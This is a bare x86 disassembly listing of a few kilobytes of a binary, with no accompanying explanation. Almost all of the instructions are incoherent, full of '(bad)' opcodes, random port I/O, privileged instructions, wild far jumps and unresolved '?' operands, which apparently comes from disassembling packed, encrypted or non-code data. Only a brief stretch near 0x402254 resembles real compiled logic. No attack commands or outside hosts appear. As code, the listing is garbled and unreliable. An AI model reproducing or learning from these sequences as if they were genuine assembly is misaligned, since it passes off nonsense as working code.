  4020ba:	iret   
  4020bb:	std    
  4020bc:	push   esi
  4020bd:	daa    
  4020be:	scas   al,BYTE PTR es:[edi]
  4020bf:	addr16 xchg esp,eax
  4020c1:	xchg   ecx,eax
  4020c2:	jecxz  0x40213f
  4020c4:	stc    
  4020c5:	or     ecx,DWORD PTR [esi-0x5d]
  4020c8:	je     0x402050
  4020ca:	mov    ch,0x5f
  4020cc:	add    al,0x4c
  4020ce:	mov    WORD PTR [ecx],fs
  4020d0:	ss enter 0xc01,0xc8
  4020d5:	jne    0x402103
  4020d7:	loop   0x4020fe
  4020d9:	cli    
  4020da:	shr    BYTE PTR [ebp-0x55],1
  4020dd:	jle    0x402068
  4020df:	test   WORD PTR [esi+0x3dc21da1],0x6e57
  4020e8:	mov    edi,0x70fcb68d
  4020ed:	popa   
  4020ee:	jle    0x40210f
  4020f0:	mov    al,ds:0x98d768e8
  4020f5:	add    edx,DWORD PTR [edx]
  4020f7:	ins    DWORD PTR es:[edi],dx
  4020f8:	xchg   edx,eax
  4020f9:	cmp    eax,0x14473
  4020fe:	cmp    BYTE PTR [esi+0x1dcba1ef],dh
  402104:	ss cld 
  402106:	loopne 0x40216d
  402108:	and    ah,0x85
  40210b:	je     0x4020bb
  40210d:	and    ebp,edi
  40210f:	sub    edx,DWORD PTR [ecx-0x2610b4ac]
  402115:	ins    BYTE PTR es:[edi],dx
  402116:	jo     0x4020bc
  402118:	xchg   ecx,eax
  402119:	sbb    BYTE PTR [edi],bh
  40211b:	out    0xe6,al
  40211d:	add    DWORD PTR [edi-0x71],0xffffff81
  402121:	aad    0x76
  402123:	xlat   BYTE PTR ds:[ebx]
  402124:	cdq    
  402125:	int    0xd2
  402127:	bound  ebp,QWORD PTR [esi]
  402129:	lods   eax,DWORD PTR ds:[esi]
  40212a:	add    bh,BYTE PTR [edx+0x501d188c]
  402130:	(bad)
  402134:	mov    edi,?
  402136:	jno    0x40216f
  402138:	test   DWORD PTR [eax*4-0x5c3b5e1d],0x494a5ccf
  402143:	pusha  
  402144:	inc    edi
  402145:	inc    ecx
  402146:	mov    al,BYTE PTR [esi-0x4b]
  402149:	bound  esp,QWORD PTR [edi+0x2e]
  40214c:	pop    esp
  40214d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40214e:	push   ebx
  40214f:	mov    ecx,0x1c3ac4b
  402154:	add    dl,BYTE PTR [edx]
  402156:	jp     0x40210c
  402158:	ins    DWORD PTR es:[edi],dx
  402159:	ret    
  40215a:	mov    ecx,0x3c63d6d0
  40215f:	popa   
  402160:	daa    
  402161:	in     eax,0x73
  402163:	outs   dx,BYTE PTR ds:[esi]
  402164:	inc    ebp
  402165:	test   DWORD PTR [esi-0x6a],0x86a2ba71
  40216c:	jo     0x402198
  40216e:	ds test al,0x5f
  402171:	int3   
  402172:	into   
  402173:	outs   dx,DWORD PTR ds:[esi]
  402174:	push   esp
  402175:	push   esi
  402176:	jmp    0x85c8f91d
  40217b:	cwde   
  40217c:	xor    esp,0x4f
  40217f:	adc    BYTE PTR [edi+eiz*4-0x42efd13e],cl
  402186:	or     cl,BYTE PTR [esi*2+0x3bfe7793]
  40218d:	fild   QWORD PTR [esi+edx*8-0x1a]
  402191:	jo     0x4021d1
  402193:	cmp    edx,DWORD PTR [edx-0x6f]
  402196:	es ds pop ds
  402199:	lods   al,BYTE PTR ds:[esi]
  40219a:	xchg   DWORD PTR [ebx-0x740922a4],ebp
  4021a0:	mov    esi,0x13659070
  4021a5:	cmp    eax,0x474e246d
  4021aa:	mov    BYTE PTR [ebx+0x56],al
  4021ad:	pop    edx
  4021ae:	test   BYTE PTR [eax],ch
  4021b0:	xlat   BYTE PTR ds:[ebx]
  4021b1:	inc    ebx
  4021b2:	jmp    0x4021d1
  4021b4:	push   cs
  4021b5:	mov    esi,0x1a4e81ac
  4021ba:	cmp    eax,0x77cc4d1d
  4021bf:	cld    
  4021c0:	outs   dx,DWORD PTR ds:[esi]
  4021c1:	mov    BYTE PTR [eax+0xdd54caf],bh
  4021c7:	outs   dx,DWORD PTR ds:[esi]
  4021c8:	es adc esp,esp
  4021cb:	(bad)  
  4021cd:	and    eax,0x8fdb7a87
  4021d2:	aad    0x5c
  4021d4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4021d6:	daa    
  4021d7:	xchg   edx,eax
  4021d8:	icebp  
  4021d9:	popf   
  4021da:	sar    esp,0x32
  4021dd:	bound  ebp,QWORD PTR [ebx-0x53]
  4021e0:	daa    
  4021e1:	fbld   TBYTE PTR [ecx]
  4021e3:	mov    dh,0x78
  4021e5:	popa   
  4021e6:	xor    ebx,DWORD PTR ds:0xd58baea9
  4021ec:	daa    
  4021ed:	or     BYTE PTR [ebx-0x33],0xa6
  4021f1:	xor    BYTE PTR [ecx],cl
  4021f3:	(bad)  
  4021f4:	out    dx,eax
  4021f5:	mov    esi,0x3e666417
  4021fa:	adc    eax,0xccd24f91
  4021ff:	mov    WORD PTR cs:[ebp+0x44e7f2ee],?
  402206:	sbb    DWORD PTR [edx+edx*1],esi
  402209:	iret   
  40220a:	ins    DWORD PTR es:[edi],dx
  40220b:	stc    
  40220c:	adc    bh,BYTE PTR [ecx-0x489d3471]
  402212:	jo     0x4021d3
  402214:	cdq    
  402215:	sub    al,0x9b
  402217:	into   
  402218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402219:	sub    bh,bh
  40221b:	ds or  eax,ebx
  40221e:	pop    ecx
  40221f:	mov    dl,0x28
  402221:	and    al,0x51
  402223:	xchg   esp,eax
  402224:	cwde   
  402225:	mov    BYTE PTR [ecx-0x3ce93b62],al
  40222b:	retf   0x281f
  40222e:	and    dh,BYTE PTR [esi-0x79f44e0a]
  402234:	cs dec edi
  402236:	cmp    DWORD PTR cs:[ecx],ebx
  402239:	sahf   
  40223a:	iret   
  40223b:	inc    ebp
  40223c:	jmp    0x102e8665
  402241:	out    dx,eax
  402242:	cmp    DWORD PTR [eax-0x3e],ebx
  402245:	ror    DWORD PTR [ebp+0x6c517aec],1
  40224b:	sbb    al,0xf3
  40224d:	rcl    BYTE PTR [esi+0x330c4d8b],1
  402253:	(bad)  
  402254:	lea    eax,[eax+eax*1+0x32729a]
  40225b:	xor    ecx,esi
  40225d:	sub    ecx,eax
  40225f:	mov    ax,WORD PTR [ebp-0x4]
  402263:	movzx  eax,ax
  402266:	cmp    eax,ecx
  402268:	mov    eax,DWORD PTR [ebp+0x10]
  40226b:	movzx  ecx,WORD PTR [ebp-0x4]
  40226f:	jg     0x40258a
  402275:	xor    eax,esi
  402277:	sub    ecx,eax
  402279:	sub    ecx,edi
  40227b:	mov    WORD PTR [ebp-0x4],cx
  40227f:	jmp    0x402597
  402284:	jmp    0x40258a
  402289:	pop    edi
  40228a:	pop    eax
  40228b:	dec    edx
  40228c:	pop    es
  40228d:	push   ebp
  40228e:	xor    DWORD PTR [ebp+0x60],edi
  402291:	push   es
  402292:	sti    
  402293:	rcr    DWORD PTR [esi+0x5fee4935],1
  402299:	add    DWORD PTR [edx],0x7c
  40229c:	jl     0x402305
  40229e:	jle    0x40231c
  4022a0:	jl     0x40222e
  4022a2:	push   eax
  4022a3:	jl     0x40226f
  4022a5:	dec    ecx
  4022a6:	push   ebp
  4022a7:	cmp    al,ch
  4022a9:	loope  0x402288
  4022ab:	sub    bl,BYTE PTR [eax+0x3a961f80]
  4022b1:	push   ebx
  4022b2:	fiadd  WORD PTR [edx-0x36]
  4022b5:	add    BYTE PTR [eax],0x92
  4022b8:	in     al,0x45
  4022ba:	xchg   ebx,eax
  4022bb:	xchg   dh,bl
  4022bd:	pop    esp
  4022be:	outs   dx,BYTE PTR ds:[esi]
  4022bf:	add    bx,WORD PTR [ebx-0x7e]
  4022c3:	jecxz  0x4022a0
  4022c5:	ins    BYTE PTR es:[edi],dx
  4022c6:	add    DWORD PTR [edi-0x418c5900],ebx
  4022cc:	mov    bl,0x90
  4022ce:	repnz cmp eax,0x1c611931
  4022d4:	test   DWORD PTR [edx-0x61],edx
  4022d7:	sub    DWORD PTR [eax*2+0x57a13534],eax
  4022de:	dec    esp
  4022df:	clc    
  4022e0:	div    DWORD PTR [ebp+0x63]
  4022e3:	pop    ds
  4022e4:	ja     0x402350
  4022e6:	retf   0x6257
  4022e9:	mov    cl,0xc4
  4022eb:	mov    DWORD PTR ds:0x41d65fb2,edx
  4022f1:	pop    edi
  4022f2:	cli    
  4022f3:	ja     0x402323
  4022f5:	mov    bl,0x15
  4022f7:	outs   dx,BYTE PTR ds:[esi]
  4022f8:	inc    esp
  4022f9:	sbb    eax,0x19ccceb5
  4022fe:	mov    ecx,DWORD PTR [edi+eax*2-0x5f]
  402302:	jno    0x40234e
  402304:	sbb    BYTE PTR [edx+0x55],bh
  402307:	push   esp
  402308:	sbb    dl,al
  40230a:	or     dh,BYTE PTR [eiz*2-0x5c6bad35]
  402311:	inc    ebx
  402312:	sbb    ebp,DWORD PTR [edi-0x6fb9084c]
  402318:	call   0x78172259
  40231d:	dec    edi
  40231e:	nop
  40231f:	jns    0x40236d
  402321:	pop    ecx
  402322:	add    al,0x0
  402324:	mov    esp,DWORD PTR [esi+0x40]
  402327:	mov    BYTE PTR [edi+0x2939a919],bh
  40232d:	cmp    BYTE PTR [edi-0x1ca3df45],cl
  402333:	outs   dx,BYTE PTR ds:[esi]
  402334:	inc    esp
  402335:	shr    DWORD PTR [ebp-0x18],1
  402338:	hlt    
  402339:	fisubr DWORD PTR [edx-0x30]
  40233c:	test   DWORD PTR [edx],eax
  40233e:	rcr    edi,1
  402340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402341:	adc    eax,0x92b64f8c
  402346:	xchg   DWORD PTR [edx+0x668881ec],ebx
  40234c:	retf   0x5eb6
  40234f:	fsubr  DWORD PTR [eax+0x3b]
  402352:	inc    ecx
  402353:	aad    0x1e
  402355:	pop    ebx
  402356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402357:	cmp    DWORD PTR [edx],ecx
  402359:	fisttp QWORD PTR [esi-0xa]
  40235c:	dec    eax
  40235d:	push   edi
  40235e:	and    DWORD PTR [ebx],esi
  402360:	cmp    DWORD PTR [edx+0x32eb5b26],esi
  402366:	aaa    
  402367:	sbb    BYTE PTR [ebp+0x40cbbb01],0x47
  40236e:	mov    bh,0x60
  402370:	scas   eax,DWORD PTR es:[edi]
  402371:	pop    ebx
  402372:	inc    eax
  402373:	mov    esi,0x3488c5d5
  402378:	sub    ecx,DWORD PTR [ebp-0x51c97df]
  40237e:	adc    eax,0x2d85a50b
  402383:	lea    ecx,[ebx-0x44832dd3]
  402389:	pop    eax
  40238a:	push   es
  40238b:	sub    eax,0x8cb544e7
  402390:	or     bl,bl
  402392:	lods   al,BYTE PTR ds:[esi]
  402393:	leave  
  402394:	xchg   BYTE PTR [ecx+ecx*4-0x29],bl
  402398:	aas    
  402399:	fs inc esp
  40239b:	and    BYTE PTR [ebx+0x57],ah
  40239e:	cli    
  40239f:	add    eax,0xd3b23acc
  4023a4:	(bad)  
  4023a5:	lahf   
  4023a6:	pop    esi
  4023a7:	stc    
  4023a8:	daa    
  4023a9:	mov    eax,DWORD PTR [edx-0x73]
  4023ac:	adc    bh,BYTE PTR [edx+0x17]
  4023af:	fisttp DWORD PTR [eax-0x6d]
  4023b2:	or     BYTE PTR [edx],ah
  4023b4:	mov    esi,DWORD PTR [edx-0x7e797108]
  4023ba:	out    dx,al
  4023bb:	inc    ecx
  4023bc:	leave  
  4023bd:	aaa    
  4023be:	add    BYTE PTR [esi-0x7d],bl
  4023c1:	add    BYTE PTR [edi-0x59],ch
  4023c4:	test   DWORD PTR [ecx+0x466d538a],ebx
  4023ca:	leave  
  4023cb:	rol    BYTE PTR [ebx],cl
  4023cd:	adc    DWORD PTR [ecx+0x38f166ae],esi
  4023d3:	sti    
  4023d4:	(bad)  
  4023d5:	jmp    0xd942:0x3ff7fee5
  4023dc:	sub    eax,0x1a44c0fe
  4023e1:	xor    cl,BYTE PTR [ecx-0x459a0949]
  4023e7:	hlt    
  4023e8:	(bad)  
  4023ea:	inc    ebp
  4023eb:	or     dl,BYTE PTR [ebx-0x4a]
  4023ee:	test   eax,0x5c763aa8
  4023f3:	cmp    eax,0x658aa8b1
  4023f8:	mov    ebx,0x87301bf8
  4023fd:	ins    DWORD PTR es:[edi],dx
  4023fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023ff:	sub    bl,cl
  402401:	(bad)  
  402403:	adc    eax,0xb9d5fe0b
  402408:	sbb    bl,BYTE PTR [esp+ecx*1-0x49]
  40240c:	jecxz  0x4023d6
  40240e:	stos   DWORD PTR es:[edi],eax
  40240f:	xchg   DWORD PTR es:[ebx+eax*1-0x78bc51d],eax
  402417:	mov    ch,0x90
  402419:	adc    al,0x40
  40241b:	adc    DWORD PTR [ebp+0x20],ecx
  40241e:	or     bl,BYTE PTR [ebp+ebp*2-0x1b68561]
  402425:	cmp    eax,0x70dfa9c7
  40242a:	pop    ebp
  40242b:	stos   BYTE PTR es:[edi],al
  40242c:	add    dl,BYTE PTR [ecx+0xaba53d2]
  402432:	dec    ecx
  402433:	mov    bl,0xe6
  402435:	test   DWORD PTR [esi-0x13],0x50593aed
  40243c:	not    edx
  40243e:	cmp    bh,al
  402440:	add    eax,0xfe47d0da
  402445:	jl     0x40243c
  402447:	push   ecx
  402448:	adc    BYTE PTR [eax],bh
  40244a:	and    eax,0x31071850
  40244f:	inc    ebx
  402450:	loopne 0x402448
  402452:	pop    ebx
  402453:	data16 (bad) 
  402455:	sub    dh,ah
  402457:	stc    
  402458:	pop    edx
  402459:	xchg   ecx,eax
  40245a:	jle    0x40242b
  40245c:	div    DWORD PTR [ecx+0x78]
  40245f:	pop    ebx
  402460:	push   eax
  402461:	retf   0xb5a6
  402464:	add    edx,DWORD PTR [edi+0x64129d8f]
  40246a:	sti    
  40246b:	mov    eax,ds:0x5cca8478
  402470:	lods   al,BYTE PTR ds:[esi]
  402471:	xchg   edi,eax
  402472:	inc    esi
  402473:	sbb    DWORD PTR [esp+esi*4-0x2e],ecx
  402477:	(bad)  
  402478:	fidiv  DWORD PTR [edi+ebx*4]
  40247b:	push   ecx
  40247c:	addr16 xchg ebx,edx
  40247f:	(bad)  
  402480:	jnp    0x402460
  402482:	jno    0x402476
  402484:	test   al,0x77
  402486:	out    dx,al
  402487:	lock and esp,esi
  40248a:	mov    BYTE PTR [ecx],ch
  40248c:	das    
  40248d:	dec    ebp
  40248e:	xchg   edx,eax
  40248f:	popf   
  402490:	and    al,0xe2
  402492:	pop    ss
  402493:	daa    
  402494:	cmp    edi,DWORD PTR [eax+0x1a]
  402497:	lods   eax,DWORD PTR ds:[esi]
  402498:	es shr ah,cl
  40249b:	jecxz  0x402423
  40249d:	and    DWORD PTR [eax-0x6e],edx
  4024a0:	daa    
  4024a1:	cmp    al,0xe5
  4024a3:	xor    eax,0xab0ba9cc
  4024a8:	add    ebp,DWORD PTR [ebp+0x4c]
  4024ab:	mov    ds:0xc0b8f3f3,eax
  4024b0:	dec    eax
  4024b1:	fadd   DWORD PTR [esi+0xa]
  4024b4:	js     0x402499
  4024b6:	mov    esi,ebp
  4024b8:	jb     0x402525
  4024ba:	pop    ss
  4024bb:	xchg   ebx,eax
  4024bc:	xchg   ebx,eax
  4024bd:	bound  esi,QWORD PTR [edi-0x70]
  4024c0:	add    cl,BYTE PTR [eax]
  4024c2:	imul   esp,DWORD PTR [edi+esi*8+0x3f80aef8],0xdb98bb67
  4024cd:	sbb    dh,al
  4024cf:	imul   edx,DWORD PTR [eax+0x1f],0x13
  4024d3:	in     al,0xff
  4024d5:	ss mov bh,0x55
  4024d8:	fs aam 0x41
  4024db:	jge    0x40248f
  4024dd:	or     BYTE PTR [ebx],cl
  4024df:	enter  0xe21a,0x8f
  4024e3:	xor    DWORD PTR [edx-0x47741986],esp
  4024e9:	mov    ?,esp
  4024eb:	cmp    ebp,0x9f69e382
  4024f1:	test   eax,0x4870bf67
  4024f6:	leave  
  4024f7:	pop    ebx
  4024f8:	test   eax,0xd5c9badd
  4024fd:	mov    esi,0xbb077ac9
  402502:	test   DWORD PTR [eax-0x7c410d09],0xf3aee65c
  40250c:	mov    DWORD PTR [ecx+0x43df7937],ecx
  402512:	mov    ds:0xcd618c5,al
  402517:	add    al,0xf2
  402519:	mov    edi,0x5e8988d1
  40251e:	idiv   ebx
  402520:	je     0x4024c9
  402522:	sbb    edi,DWORD PTR [edi]
  402524:	cmp    eax,0x12f124a7
  402529:	xor    esp,DWORD PTR [esp+ebp*8+0x0]
  40252d:	push   ss
  40252e:	adc    ah,BYTE PTR [ebx]
  402530:	jnp    0x402573
  402532:	daa    
  402533:	add    DWORD PTR [esi-0x5e],esi
  402536:	js     0x4024f3
  402538:	add    al,0xd6
  40253a:	clc    
  40253b:	or     eax,DWORD PTR [edi]
  40253d:	arpl   si,bx
  40253f:	mov    ah,0x9f
  402541:	out    0x6e,eax
  402543:	cmp    dh,BYTE PTR [edi+esi*4+0x2c3576d6]
  40254a:	mov    bh,0xaf
  40254c:	pop    ds
  40254d:	cmc    
  40254e:	mov    al,0xf3
  402550:	scas   eax,DWORD PTR es:[edi]
  402551:	xchg   esi,eax
  402552:	inc    esi
  402553:	pop    edi
  402554:	adc    ch,BYTE PTR [ecx-0x594951e0]
  40255a:	in     al,0xbc
  40255c:	and    bl,dl
  40255e:	(bad)  
  40255f:	adc    DWORD PTR [eax+edx*8],esi
  402562:	or     eax,0xc031db57
  402567:	adc    al,0x5d
  402569:	cmp    eax,0xe3aad516
  40256e:	test   eax,0x25896290
  402573:	lock lock popf 
  402576:	dec    eax
  402577:	add    BYTE PTR ds:0x93b8fb08,dl
  40257d:	lock or eax,0x14a89409
  402583:	ins    BYTE PTR es:[edi],dx
  402584:	add    cl,BYTE PTR [edi]
  402586:	pop    ebp
  402587:	add    al,0xed
  402589:	or     eax,0x848dc633
  40258e:	or     BYTE PTR [edx+0x66003272],bl
  402594:	mov    DWORD PTR [ebp-0x4],eax
  402597:	mov    eax,DWORD PTR [ebp-0xc]
  40259a:	cmp    eax,ebx
  40259c:	jmp    0x4028a2
  4025a1:	mov    cs,WORD PTR [edx-0x1e6f1870]
  4025a7:	jne    0x402626
  4025a9:	adc    BYTE PTR [eax-0x26],0xee
  4025ad:	mov    cl,0x0
  4025af:	cmp    al,BYTE PTR [ecx]
  4025b1:	jmp    0x7c7e:0x677c7c0f
  4025b8:	jl     0x4025da
  4025ba:	mov    eax,0xfc3545c8
  4025bf:	cmc    
  4025c0:	fwait
  4025c1:	(bad)  
  4025c2:	sbb    esi,DWORD PTR [ebx-0x8]
  4025c5:	fimul  DWORD PTR [eax+0x2029c48a]
  4025cb:	pop    ds
  4025cc:	jge    0x40264c
  4025ce:	xchg   edi,eax
  4025cf:	cmp    al,0x59
  4025d1:	das    
  4025d2:	dec    ebp
  4025d3:	test   DWORD PTR [edx-0xd],ecx
  4025d6:	dec    ecx
  4025d7:	and    ebx,0x77
  4025da:	sar    DWORD PTR [ebp+0x7f],1
  4025dd:	inc    esi
  4025de:	and    BYTE PTR [edx],cl
  4025e0:	add    ebx,esi
  4025e2:	retf   
  4025e3:	push   eax
  4025e4:	xchg   ebp,eax
  4025e5:	outs   dx,DWORD PTR ds:[esi]
  4025e6:	push   eax
  4025e7:	clc    
  4025e8:	or     esp,DWORD PTR cs:[ebx+edx*2-0x4]
  4025ed:	xchg   ecx,eax
  4025ee:	arpl   WORD PTR [ecx],bx
  4025f0:	dec    esp
  4025f1:	xor    DWORD PTR [ecx],esp
  4025f3:	xchg   ebp,eax
  4025f4:	pushf  
  4025f5:	mov    eax,ds:0xa3804468
  4025fa:	or     al,0x6d
  4025fc:	les    edx,FWORD PTR [eax]
  4025fe:	call   0x9f206f5a
  402603:	shl    DWORD PTR [esi-0x7b],1
  402606:	or     DWORD PTR [esi+0x608c88be],esp
  40260c:	(bad)  
  40260d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40260e:	in     eax,0x7e
  402610:	out    dx,eax
  402611:	(bad)  
  402612:	ds sbb ch,dh
  402615:	xchg   DWORD PTR [edi-0x6],edx
  402618:	mov    ds:0x5887eae3,al
  40261d:	xchg   edi,eax
  40261e:	sbb    eax,0x6ddcbd5c
  402623:	xor    bl,ah
  402625:	(bad)  
  402626:	cmp    eax,0x7969eba6
  40262b:	pop    ss
  40262c:	cs or  eax,0xc2b4b4cd
  402632:	loop   0x40262c
  402634:	mov    eax,edi
  402636:	pop    ss
  402637:	sbb    al,BYTE PTR [ebp+ebx*8-0x1d]
  40263b:	nop
  40263c:	int    0xac
  40263e:	outs   dx,BYTE PTR ds:[esi]
  40263f:	mov    bh,0x67
  402641:	push   edx
  402642:	fld    TBYTE PTR [ecx-0x6e]
  402645:	add    eax,0x9e766bd0
  40264a:	test   eax,0xab695890
  40264f:	cmc    
  402650:	jne    0x4025e0
  402652:	(bad)  
  402653:	enter  0xf9bb,0xc6
  402657:	xor    esp,edx
  402659:	dec    dl
  40265b:	adc    eax,0x46e409cb
  402660:	xor    eax,0x40661edd
  402665:	dec    esi
  402666:	and    edx,DWORD PTR [eax]
  402668:	pop    eax
  402669:	ja     0x40266d
  40266b:	pop    es
  40266c:	add    eax,DWORD PTR [ebx+ecx*2-0x43]
  402670:	jle    0x4026d2
  402672:	hlt    
  402673:	sub    BYTE PTR [edi-0x6e],0x68
  402677:	mov    ds:0x450fb462,al
  40267c:	arpl   WORD PTR [edx+0x2500ac90],ax
  402682:	cmp    al,0x8e
  402684:	inc    ebx
  402685:	pop    ebx
  402686:	push   edi
  402687:	aam    0x6c
  402689:	int    0xb
  40268b:	pop    DWORD PTR [esi]
  40268d:	loope  0x402635
  40268f:	mov    BYTE PTR [edi],dl
  402691:	aas    
  402692:	fsub   DWORD PTR ds:0x5a9c71a
  402698:	jne    0x4026af
  40269a:	adc    DWORD PTR [ebx+ecx*8],edx
  40269d:	sub    dh,BYTE PTR [ebp+0x32]
  4026a0:	jmp    0x4026f5
  4026a2:	stos   BYTE PTR es:[edi],al
  4026a3:	jne    0x40262b
  4026a5:	or     edi,DWORD PTR [esi+edi*1]
  4026a8:	(bad)  
  4026a9:	or     BYTE PTR [ecx],al
  4026ab:	add    DWORD PTR [eax+0x3b76a771],edi
  4026b1:	sub    al,0x17
  4026b3:	mov    bl,bl
  4026b5:	sbb    bh,bh
  4026b7:	dec    edi
  4026b8:	and    al,0x3c
  4026ba:	inc    ebx
  4026bb:	dec    edi
  4026bc:	mov    esi,0xc36ffa62
  4026c1:	lds    eax,FWORD PTR [edx]
  4026c3:	lock imul edx,DWORD PTR [ecx*2-0x56d40065],0xffffffd5
  4026cc:	jl     0x40269a
  4026ce:	(bad)  
  4026cf:	in     eax,0x74
  4026d1:	push   cs
  4026d2:	pop    edx
  4026d3:	xchg   edx,eax
  4026d4:	pop    ds
  4026d5:	and    al,0xbb
  4026d7:	push   edi
  4026d8:	mov    al,0xbb
  4026da:	xor    al,0x55
  4026dc:	in     eax,0x74
  4026de:	push   eax
  4026df:	xor    DWORD PTR [ebx],ecx
  4026e1:	push   0xb4de5c6c
  4026e6:	mov    cl,0xca
  4026e8:	push   esi
  4026e9:	in     eax,dx
  4026ea:	mov    dl,0x32
  4026ec:	add    DWORD PTR [edi+0x3306a72d],edx
  4026f2:	mov    ah,0xbf
  4026f4:	rol    ah,1
  4026f6:	enter  0xce84,0x7a
  4026fa:	fiadd  WORD PTR [eax+esi*2-0x1e4740aa]
  402701:	neg    esi
  402703:	ficomp DWORD PTR [edx]
  402705:	add    eax,ebp
  402707:	jmp    0x4026e9
  402709:	pop    ebp
  40270a:	mov    ebx,0x9a25dbf0
  40270f:	push   cs
  402710:	call   0x77c6ca21
  402715:	mov    ch,0xe6
  402717:	lea    edx,[ebx-0x7d]
  40271a:	imul   esi,DWORD PTR [esi-0x72],0xbd047080
  402721:	xor    al,0x1e
  402723:	imul   edi,DWORD PTR [ecx],0x29f20654
  402729:	mov    dh,0x18
  40272b:	je     0x402720
  40272d:	or     dl,BYTE PTR [ecx-0x22]
  402730:	push   eax
  402731:	jae    0x402705
  402733:	fiadd  WORD PTR [eax+0x53806576]
  402739:	pop    ds
  40273a:	xlat   BYTE PTR ds:[ebx]
  40273b:	ror    DWORD PTR [eax],0x31
  40273e:	sbb    esi,DWORD PTR [esi]
  402740:	inc    edi
  402741:	lods   eax,DWORD PTR ds:[esi]
  402742:	adc    bl,BYTE PTR [ebx-0x80]
  402745:	sub    al,0xd3
  402747:	pop    edi
  402748:	jge    0x4027c1
  40274a:	ret    0xd5f2
  40274d:	dec    eax
  40274e:	ficomp DWORD PTR [ecx]
  402750:	inc    ebp
  402751:	fcom   QWORD PTR [eax+0x5318a6e5]
  402757:	xlat   BYTE PTR ds:[ebx]
  402758:	push   0xf
  40275a:	enter  0xa103,0x33
  40275e:	imul   eax,DWORD PTR [edi],0x58
  402761:	call   0x8005:0xee3ee284
  402768:	mov    ds:0x519867bd,eax
  40276d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40276e:	xchg   ecx,eax
  40276f:	in     al,0x4d
  402771:	cdq    
  402772:	nop
  402773:	mov    ds,WORD PTR [ebx+0x7d]
  402776:	in     al,0x95
  402778:	pusha  
  402779:	xor    BYTE PTR [ebx],al
  40277b:	into   
  40277c:	ins    BYTE PTR es:[edi],dx
  40277d:	cs pop eax
  40277f:	xchg   ecx,eax
  402780:	sub    al,0x8a
  402782:	pop    ebp
  402783:	pop    ecx
  402784:	(bad)  
  402786:	add    esi,DWORD PTR [edi-0x28]
  402789:	lds    esp,FWORD PTR [edi+0x10]
  40278c:	jg     0x4027ed
  40278e:	ins    DWORD PTR es:[edi],dx
  40278f:	jmp    0x8d06:0x7863e5db
  402796:	push   eax
  402797:	ja     0x402814
  402799:	mul    DWORD PTR [edi]
  40279b:	adc    BYTE PTR ds:0xcf3ad3ec,ah
  4027a1:	lods   eax,DWORD PTR ds:[esi]
  4027a2:	sbb    eax,0x98dafa93
  4027a7:	xor    BYTE PTR [ebp-0x3e5c7c24],ah
  4027ad:	mov    ds:0xb58bb187,al
  4027b2:	mov    eax,0x8b40ecf3
  4027b7:	adc    al,BYTE PTR [ecx+edi*2+0x656a822]
  4027be:	push   ebp
  4027bf:	aas    
  4027c0:	shl    BYTE PTR [ebx-0x12],0x5d
  4027c4:	loope  0x402762
  4027c6:	or     al,0x1
  4027c8:	push   es
  4027c9:	push   ecx
  4027ca:	push   ds
  4027cb:	iret   
  4027cc:	loopne 0x402843
  4027ce:	loope  0x402800
  4027d0:	(bad)  
  4027d1:	out    dx,eax
  4027d2:	dec    edx
  4027d3:	sbb    DWORD PTR [ebx],ebx
  4027d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027d6:	xchg   ebp,eax
  4027d7:	mov    ds:0x53190033,al
  4027dc:	clc    
  4027dd:	sub    al,0x6
  4027df:	mov    ds:0x4ab2097,eax
  4027e4:	fistp  WORD PTR [ebx+0x15]
  4027e7:	mov    esp,0x1f07e69c
  4027ec:	shl    ah,0x6f
  4027ef:	aad    0xd0
  4027f1:	pop    es
  4027f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027f3:	shr    DWORD PTR [eax+0x3bfaa072],0xa0
  4027fa:	minps  xmm6,xmm5
  4027fd:	or     al,0x9
  4027ff:	push   es
  402800:	push   ebx
  402801:	sub    eax,DWORD PTR [edi+ebx*4]
  402804:	inc    esi
  402805:	push   ebp
  402806:	fild   QWORD PTR [ecx-0x3f]
  402809:	cmp    esi,esp
  40280b:	in     eax,dx
  40280c:	(bad)  
  40280f:	ja     0x402809
  402811:	sbb    ebp,edi
  402813:	ret    
  402814:	xchg   ch,bh
  402816:	mov    ebp,0xbb1649b0
  40281b:	fisub  WORD PTR [ebx]
  40281d:	shl    BYTE PTR [edx-0x3e4d3770],1
  402823:	repnz mov ebp,0xead9a6c1
  402829:	out    dx,eax
  40282a:	or     ecx,ebp
  40282c:	xor    DWORD PTR [ebp+edx*1+0x259c32b6],edx
  402833:	xchg   edi,eax
  402834:	and    BYTE PTR [edx+0x64],bh
  402837:	jae    0x4028aa
  402839:	int3   
  40283a:	out    dx,eax
  40283b:	gs sub cl,al
  40283e:	cwde   
  40283f:	ds jecxz 0x402877
  402842:	sbb    ebp,ebp
  402844:	stos   BYTE PTR es:[edi],al
  402845:	pop    ds
  402846:	ins    BYTE PTR es:[edi],dx
  402847:	in     al,0x6d
  402849:	push   es
  40284a:	sahf   
  40284b:	call   DWORD PTR [eax-0x5d]
  40284e:	lods   eax,DWORD PTR ds:[esi]
  40284f:	push   0xffffffee
  402851:	mul    BYTE PTR [ecx-0x5e]
  402854:	in     al,0xd4
  402856:	dec    ecx
  402857:	sub    DWORD PTR ds:0x27d04b6,edi
  40285d:	fistp  DWORD PTR ds:0xa048af05
  402863:	or     al,BYTE PTR [edi]
  402865:	scas   al,BYTE PTR es:[edi]
  402866:	xlat   BYTE PTR ds:[ebx]
  402867:	lock frstor gs:[ebx-0x36]
  40286c:	jbe    0x4028d6
  40286e:	fild   DWORD PTR [ecx+eiz*4-0x42]
  402872:	sahf   
  402873:	push   esi
  402874:	or     eax,0xf5a2d510
  402879:	push   cs
  40287a:	dec    esi
  40287b:	icebp  
  40287c:	mov    DWORD PTR [edx],ebx
  40287e:	lea    ebp,[edi+0x3d]
  402881:	push   esp
  402882:	ins    DWORD PTR es:[edi],dx
  402883:	js     0x4028e3
  402885:	mov    eax,ds:0xe7cb6dd6
  40288a:	cmp    ecx,DWORD PTR [edi-0x7b]
  40288d:	rol    BYTE PTR [edi+0x65],1
  402890:	test   al,0xaf
